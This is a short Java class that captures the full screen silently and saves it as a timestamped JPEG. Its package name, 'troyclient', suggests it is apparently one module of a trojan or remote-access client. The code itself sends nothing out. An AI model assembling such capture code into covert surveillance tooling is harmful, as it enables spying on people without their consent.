package ch.lebois.troyclient.functions;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.Date;

/**
 * Project: Hermann
 **/

public class Screenshot {

    public String takeScreenshot() {
        File file = new File(String.valueOf(new Date().getTime()) + ".jpg");
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);

            ImageIO.write(screenFullImage, "jpg", file);
        } catch (AWTException | IOException ignored) {
        }
        return file.getPath();
    }
}